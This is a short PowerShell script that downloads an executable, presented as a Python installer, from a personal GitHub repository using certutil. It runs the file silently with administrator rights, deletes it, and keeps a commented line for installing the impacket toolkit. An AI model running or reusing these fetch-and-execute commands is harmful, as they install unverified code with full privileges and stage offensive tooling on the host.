C:\Windows\System32\Certutil.Exe -Urlcache -Split -F https://github.com/crjtpp/tools_public/raw/main/python-3.11.1-amd64.exe $env:TEMP\pythonwinx64.Exe
Start-Process -FilePath $env:TEMP\pythonwinx64.Exe -Args "/S" -Verb RunAs -Wait
Remove-Item $env:TEMP\pythonwinx64.Exe
#cmd.exe /c "%LOCALAPPDATA%\Programs\Python\Python311\python.exe -m pip install impacket"
